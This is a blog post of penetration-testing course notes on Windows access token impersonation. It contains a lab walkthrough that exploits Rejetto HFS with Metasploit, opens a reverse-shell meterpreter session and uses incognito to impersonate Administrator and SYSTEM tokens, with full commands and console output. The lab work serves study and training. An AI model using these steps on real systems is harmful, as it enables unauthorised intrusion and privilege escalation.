---
layout: post
title: "Access Token Impersonation"
date: "2022-10-01"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Access Token Impersonation（访问令牌模拟）
## Windows 访问令牌
Windows 访问令牌是 Windows 上身份验证过程的核心元素，由本地安全机构子系统服务 (LSASS) 创建和管理。

Windows 访问令牌负责识别和描述系统上运行的进程或线程的安全上下文。简而言之，可以将访问令牌视为类似于 Web cookie 的临时密钥，它为用户提供对系统或网络资源的访问权限，而无需在每次启动进程或访问系统资源时提供凭据。

每次用户成功通过身份验证时，winlogon.exe 进程都会生成访问令牌，其中包括与线程或进程关联的用户帐户的标识和权限。然后将此令牌附加到 userinit.exe 进程，之后用户启动的所有子进程将从其创建者那里继承访问令牌的副本，并将在同一访问令牌的权限下运行。

Login page is handled by winlogon.exe, whenever you type in the password of account you are logging into, winlogon.exe will generate access token, the access token includes the identity and privileges of the user account.
userinit is the process that is used to create other processes. If I logon a Windows system, winlogon.exe will generate an access token, and it then will be attached to userinit.exe. 

## Windows 访问令牌
Windows 访问令牌根据分配给它们的不同安全级别进行分类。 这些安全级别用于确定分配给特定令牌的权限。

访问令牌通常会被分配以下安全级别之一：

模拟级别令牌是作为 Windows 上非交互式登录的直接结果创建的，通常通过特定的系统服务或域登录。

委托级令牌通常通过 Windows 上的交互式登录创建，主要是通过传统登录或通过 RDP 等远程访问协议。

模拟级别的令牌可用于模拟本地系统上的令牌，而不是任何使用该令牌的外部系统。

委托级令牌构成最大的威胁，因为它们可用于在任何系统上模拟令牌。

## Windows 权限
模拟访问令牌以提升系统特权的过程将主要取决于分配给已被利用以获得初始访问权限的帐户的特权以及可用的模拟或委托令牌。

以下是成功的模拟攻击所需的特权：

SeAssignPrimaryToken：这允许用户模拟令牌。

SeCreateToken：这允许用户创建具有管理权限的任意令牌。

SeImpersonatePrivilege：这允许用户在通常具有管理权限的另一个用户的安全上下文下创建进程。


1. Utilizing currently available access tokens, impersonating them, in order to elevate privileges.
2. Potato attack. It order to get `NT AUTHORITY\SYSTEM` access token generated so that you can impersonate.

# Demo: Access Token Impersonation（演示：访问令牌模拟）

```
Target IP Address: 10.2.24.20
```

```
nmap 10.2.24.20
```

```
service postgresql start && msfconsole -q

search rejetto
use 0
show options
set RHOSTS 10.2.24.20
exploit
```

Migrate our meterpreter session into the process. Look for the process id of the explorer process. Access is denied, because we currently have access to a non-privileged user account.

We have `SeImpersonatePrivilege`, which means we can utilize this particular user account (meterpreter session) to impersonate other access token available.

Load incognito and the meterpreter session died, that is because we try to migrate to a process.

```
meterpreter > sysinfo
meterpreter > pgrep explorer
3512
meterpreter > migrate 3512
[-] core_migrate: Operation failed: Access is denied.
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > getprivs

Enable Process Privileges
=========================
Name
----
SeImpersonatePrivilege

meterpreter > load incognito
meterpreter > expolit
```

`-u`: List the user account access token.

We have Administrator account's access token available, which will provide us with elevated privileges.

```
meterpreter > load incognito
meterpreter > list_tokens -u

Delegation Tokens Available
===========================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
==============================
No tokens available
```

In order to impersonate this particular access token:

```
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getprivs
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.
meterpreter > prep explorer
3512
meterpreter > migrate 3512
meterpreter > getprivs
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

If you are in the situation, list out tokens available, you don't find any privileged access token available in regardless of whether the delegation tokens or impersonation tokens. You need to use protato attack, it will generate a `NT AUTHORITY\SYSTEM` access token that you can then impersonate the privilege associated with the `NT AUTHORITY` access token, or use the privileges associated with Administrator users.

```
meterpreter > list_token -u

Delegation Tokens Available
===========================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\SYSTEM
Windows Manager\DWM-1

Impersonation Tokens Available
==============================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\NETWORK SERVICE

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs
```

This particular attack depend on a few fators:

What user accounts are currently under system which of these user accounts has an admin access or admin priveleges or what user accounts are part of the local administrators group. If you can find an access token that is available to impersonate and then you can impersonate and obtain the privelege associated with that particular access token. It does not need to belong to a particular user, it could also belong to `NT AUTHORITY\SYSTEM`. There's not much sense in impersonating an account with lower priveleges than what you currently have.

# Privilege Escalation: Impersonate（权限提升：冒充）
## 概述
为您提供了一个 Kali GUI 机器和一个运行易受攻击应用程序的目标机器。目标机器的 IP 地址在 Kali 机器桌面 (/root/Desktop/target) 上名为 target 的文本文件中提供。  

你的任务是使用 Kali 机器上可用的工具对应用程序进行指纹识别，并使用适当的 Metasploit 模块利用机器。然后，执行权限提升以读取放置在 C\Users\Administrator\Desktop\flag.txt 中的标志。

目标：利用应用程序并读取标志。

说明：
* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口 运行 “ip addr” 可以知道 X 和 Y 的值。 
* 目标机器的 IP 地址在文件 “/root/Desktop/target” 中提到
* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关
## 我自己的思路
```
Target IP Address : 10.0.20.230
```

```
root@attackdefense:~# nmap 10.0.20.230
Starting Nmap 7.91 ( https://nmap.org ) at 2022-10-01 07:51 IST
Nmap scan report for 10.0.20.230
Host is up (0.0100s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
```

```
root@attackdefense:~# nmap -sV -p 80 10.0.20.230
Starting Nmap 7.91 ( https://nmap.org ) at 2022-10-01 07:52 IST
Nmap scan report for 10.0.20.230
Host is up (0.0029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 13 database server: main.
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.0.20.230
RHOSTS => 10.0.20.230
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Using URL: http://0.0.0.0:8080/HH9f1Yros44lsM
[*] Local IP: http://10.10.16.2:8080/HH9f1Yros44lsM
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /HH9f1Yros44lsM
[*] Sending stage (175174 bytes) to 10.0.20.230
[!] Tried to delete %TEMP%\tDQmyDdrpKN.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.16.2:4444 -> 10.0.20.230:49775) at 2022-10-01 07:59:16 +0530
[*] Server stopped.

meterpreter > 

```

账户`NT AUTHORITY\LOCAL SERVICE`是非特权账户，但是有`SeImpersonatePrivilege`权限，可以模仿其他用户的访问令牌。

```
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > pgrep explorer
3508
meterpreter > migrate 3508
[*] Migrating from 580 to 3508...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege
meterpreter > load incognito
Loading extension incognito...
[*] 10.0.20.230 - Meterpreter session 1 closed.  Reason: Died

[-] Failed to load extension: No response was received to the core_loadlib request.
```

[FUN WITH INCOGNITO](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)

账户`ATTACKDEFENSE\Administrator`有`SeImpersonatePrivilege`权限，并且可用的管理员令牌中有`NT AUTHORITY\SYSTEM`。

```
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.16.2:4444 
[*] Using URL: http://0.0.0.0:8080/buVdTKQh0y9
[*] Local IP: http://10.10.16.2:8080/buVdTKQh0y9
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /buVdTKQh0y9
[*] Sending stage (175174 bytes) to 10.0.20.230
[!] Tried to delete %TEMP%\MToZeXgiS.vbs, unknown result
[*] Meterpreter session 2 opened (10.10.16.2:4444 -> 10.0.20.230:49806) at 2022-10-01 08:07:10 +0530
[*] Server stopped.

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > help
Incognito Commands
==================

    Command              Description
    -------              -----------
    add_group_user       Attempt to add a user to a global group with all tokens
    add_localgroup_user  Attempt to add a user to a local group with all tokens
    add_user             Attempt to add a user with all tokens
    impersonate_token    Impersonate specified token
    list_tokens          List tokens available under current user context
    snarf_hashes         Snarf challenge/response hashes for every token
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getprivs
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.
meterpreter > pgrep explorer
3508
meterpreter > migrate 3508
[*] Migrating from 1424 to 3508...
[*] Migration completed successfully.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

```

账户`NT AUTHORITY\SYSTEM`有`SeImpersonatePrivilege`权限。

```
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\NETWORK SERVICE

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
meterpreter > cat C:\\Users\\Administrator\\Desktop\\flag.txt
x28c832a39730b7d46d6c38f1ea18e12
```

The flag in `C:\\Users\\Administrator\\Desktop\\flag.txt` is `x28c832a39730b7d46d6c38f1ea18e12`。

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2353.pdf

[Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)](https://www.exploit-db.com/exploits/39161)

[Rejetto HttpFileServer Remote Command Execution](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/)
